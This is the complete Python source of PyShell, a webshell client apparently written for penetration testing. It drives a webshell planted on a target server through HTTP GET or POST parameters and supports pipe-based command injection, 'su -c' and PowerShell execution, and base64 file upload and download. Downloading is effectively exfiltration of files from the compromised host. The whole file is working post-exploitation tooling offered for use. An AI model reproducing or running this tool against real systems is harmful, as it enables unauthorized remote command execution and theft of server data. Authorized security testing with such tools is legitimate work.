#!/usr/bin/python3
import sys, os
import requests
# import readline
import argparse
import base64
import urllib3
from termcolor import colored

urllib3.disable_warnings()

def send_command(command, webshell, method, param="code"):
   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
   "Authorization":args.auth, "Cookie":args.cookies}
   params = {param.strip():command.strip()}
   if (method.upper() == "GET"):
      response = requests.get((webshell), params=params, headers=headers, verify=False)
   elif (method.upper() == "POST"):
      response = requests.post((webshell), data=params, headers=headers, verify=False)
   return response.content.decode(errors="ignore")

if __name__ == "__main__":
 banner = """
  ██████ ▓██   ░██  ██████  ██░ ██ ▓█████  ██▓     ██▓    
 ▓██░  ██▒██░   ██▒██    ▒ ▓██  ██▒▓██    ▓██▒    ▓██▒    
 ▓██░  ██▒ ██  ██░░ ▓███   ▒██████░▒████  ▒██░    ▒██░    
 ▒██████ ▒ ░████▓░  ▒   ██▒░██ ░██ ▒██    ▒██░    ▒██░    
 ▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░██▒░██▓░█████▒░██████▒░██████▒
 ▒██░ ░  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░▒ ░     ▓██ ░▒░ ░ ░▒    ░ ▒ ░ ░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░░   ░   ▒ ▒ ░░  ░  ░  ░   ░  ░░ ░         ░ ░     ░ ░   
 ░        ░             ░      ░      ░       ░          ░ 

  -------------- by @JoelGMSec & @3v4Si0N ---------------
 """

print (colored(banner, "green"))
parser = argparse.ArgumentParser()
parser.add_argument("url", help="Webshell URL", type=str)
parser.add_argument("method", help="HTTP Method to execute command (GET or POST)", type=str)
parser.add_argument("-a", "--auth", help="Authorization header to use on each request", type=str)
parser.add_argument("-c", "--cookies", help="Cookie header to use on each request", type=str)
parser.add_argument("-p", "--param", default="code", help="Parameter to use with custom WebShell", type=str)
parser.add_argument("-pi", "--pipe", action="store_true", help="Pipe all commands after parameter")
parser.add_argument("-su", "--sudo", action="store_true", help="Sudo command execution (Only on Linux hosts)")
parser.add_argument("-ps", "--PowerShell", action="store_true", help="PowerShell command execution (Only on Windows hosts)")
args = parser.parse_args()

try:
   WEBSHELL = args.url
   HTTP_METHOD = args.method
   PARAM = args.param
   PIPE = ""
   COMMAND_LIST = ["ls", "dir", "cat", "type", "rm", "del", "file"]
   if args.pipe:
      PIPE = "|"
   whoami = send_command(PIPE + "whoami", WEBSHELL, HTTP_METHOD, PARAM)
   whoami = whoami.replace("<pre>","").replace("</pre>","")
   if args.sudo:
      whoami = "root"
   hostname = send_command(PIPE + "hostname", WEBSHELL, HTTP_METHOD, PARAM)
   hostname = hostname.replace("<pre>","").replace("</pre>","")
   cwd = "" ; slash = "\\"
   if not slash in whoami:
      path = send_command(PIPE + "pwd", WEBSHELL, HTTP_METHOD, PARAM)
      path = path.replace("<pre>","").replace("</pre>","")
      system = "linux" ; slash = "/"
   else:
      path = send_command(PIPE + "(pwd).path", WEBSHELL, HTTP_METHOD, PARAM)
      path = path.replace("<pre>","").replace("</pre>","")
      system = "windows" ; whoami = whoami.split("\\")[1]

   while True:
      try:
         print (colored(" [PyShell] ", "grey", "on_green"), end = "") ; print (colored(" ", "green", "on_blue"), end = "")
         print (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip()+" ", "grey", "on_blue"), end = "")
         if len(path.rstrip()) > 30:
            shortpath = path.rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
            print (colored(" ", "blue", "on_yellow"), end = "") ; print (colored(shortpath.rstrip()+" ", "grey", "on_yellow"), end = "")
         else:
            print (colored(" ", "blue", "on_yellow"), end = "") ; print (colored(path.rstrip()+" ", "grey", "on_yellow"), end = "")
         print (colored(" ", "yellow"), end = "")
         command = input()
         if command == "exit":
            print (colored("[!] Exiting..\n", "red"))
            break
         else:
            if len(command) == 0:
               print("\n")
               continue
            if not command.split():
               print()
               continue
            if "clear" in command.split()[0] or "cls" in command.split()[0]:
               os.system("clear")
               continue
            if "upload" in command.split()[0]:
               if len(command.split()) == 1 or len(command.split()) == 2:
                  print (colored("[!] Usage: upload local_file.ext remote_file.ext\n", "red"))
               else:
                  localfile = command.split()[1]
                  remotefile = command.split()[2]
                  remotefiletmp = remotefile.rstrip() + ".tmp"
                  if not slash in remotefile:
                     if remotefile == ".":
                        remotefile = path.rstrip() + slash + command.split()[1]
                     else:
                         remotefile = path.rstrip() + slash + command.split()[2]
                  if not slash in localfile:
                     cwd = os.getcwd()
                  try:
                     f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
                  except OSError:
                     print (colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                     continue
                  print (colored("[+] Uploading file "+ cwd + "/" + localfile +" on "+ remotefile +"..\n", "yellow"))
                  upload = send_command(PIPE + "echo " + str(base64data.rstrip(), "utf8") + " > " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                  if system == "linux":
                     send_command(PIPE + "base64 -di " + remotefile + " > " + remotefiletmp + " ; mv " + remotefiletmp + " " +
                     remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                  if system == "windows":
                     command = " ; [System.Convert]::FromBase64String($base64) | Set-Content -Encoding Byte "
                     send_command(PIPE + "$base64 = cat -Encoding UTF8 " + remotefile + command + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
            else:
               if "download" in command.split()[0]: 
                  if len(command.split()) == 1 or len(command.split()) == 2:
                     print (colored("[!] Usage: download remote_file.ext local_file.ext\n", "red"))
                  else:
                     remotefile = command.split()[1]
                     localfile = command.split()[2]
                     if not slash in remotefile:
                        remotefile = path.rstrip() + slash + command.split()[1]
                     if not slash in localfile:
                        cwd = os.getcwd()
                        if localfile == ".":
                           localfile = command.split()[1]
                     print (colored("[+] Downloading file "+ remotefile +" on "+ cwd + "/" + localfile +"..\n", "yellow"))
                     if system == "linux":
                        base64data = send_command(PIPE + "base64 " + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
                     if system == "windows":
                         command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
                         base64data = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                     base64data = base64data.replace("<pre>","").replace("</pre>","")
                     download = base64.b64decode(base64data.encode("utf8"))
                     f = open(localfile, "wb") ; f.write(download) ; f.close()
               else:
                  if "pwd" in command.split()[0]:
                     print (colored(path, "yellow"))
                  else:
                     if "cd" in command.split()[0]:
                        if command.split()[1] == ".":
                           continue
                        if ".." in command.split()[1]:
                           path = path.split(slash)[:-1]
                           path = (slash.join(path))
                        else:
                           if not slash in command.split()[1]:
                              path = path.rstrip() + slash + command.split()[1]
                           else:
                              path = command.split()[1]   
                     else:
                        if command.split()[0] in COMMAND_LIST:
                           command_array = command.split(" ")
                           param = ""
                           for i in list(command_array):
                              if i.startswith("-"):
                                 param += i + " "
                                 command_array.remove(i)
                           cmd = command_array.pop(0)
                           if len(command_array) == 0:
                              relative_path = ""
                           else:
                              relative_path = command_array[0]
                           if not slash in relative_path:
                              command = cmd + " " + param + path.rstrip() + slash + relative_path
                           content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                           content = content.replace("<pre>","").replace("</pre>","")
                           print (colored(content, "yellow"))
                        else:
                           if args.PowerShell:
                              content = send_command(PIPE + "powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
                              content = content.replace("<pre>","").replace("</pre>","")
                              print (colored(content, "yellow"))  
                           else:
                              if args.sudo:
                                 content = send_command(PIPE + "su -c " + command, WEBSHELL, HTTP_METHOD, PARAM)
                                 content = content.replace("<pre>","").replace("</pre>","")
                                 print (colored(content, "yellow"))
                              else:
                                 content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                                 content = content.replace("<pre>","").replace("</pre>","")
                                 print (colored(content, "yellow"))

      except KeyboardInterrupt:
         print (colored("\n[!] Exiting..\n", "red"))
         break

except Exception as e:
   print(e)
